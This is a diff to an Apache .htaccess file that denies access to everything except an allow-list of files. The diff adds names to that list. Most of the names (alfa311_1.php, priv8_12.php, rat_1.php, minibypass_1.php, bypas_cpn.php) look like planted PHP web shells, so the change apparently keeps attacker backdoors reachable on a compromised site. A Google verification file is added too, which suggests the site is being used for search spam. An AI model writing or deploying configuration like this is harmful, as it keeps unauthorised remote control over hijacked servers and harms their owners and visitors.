@@ -4,7 +4,8 @@ Deny from all
     Order allow,deny
     Allow from all
 </FilesMatch>
-<FilesMatch '^(|baja_cpan.php|admin_cpn.php|rat_1.php|admin_12.php|bypas_cpn.php|bypas_cpn.php|super_kuat.php|ssilengkap.ShtMl|super_by.php|lock_lock21.php|minibypass_1.php|alfa311_1.php|priv8_12.php|css_13.php|db_354@.php|super_super.php|index.html|sitemap.xml|kuat354.PHP|kuat354.php|moli.php|Super-King.PHP|)$'>
+<FilesMatch '^(alfa311_1.PhP|baja_cpan.php|8.PHP|admin_cpn.php|rat_1.php|admin_12.php|bypas_cpn.php|bypas_cpn.php|super_kuat.php|ssilengkap.ShtMl|super_by.php|lock_lock21.php|minibypass_1.php|alfa311_1.php|priv8_12.php|css_13.php|db_354@.php|super_super.php|index.html|sitemap.xml|robots.txt|googlee077984653c9b15b.html|kuat354.PHP|kuat354.php|moli.php|Super-King.PHP)$'>
     Order allow,deny
     Allow from all
 </FilesMatch>
+
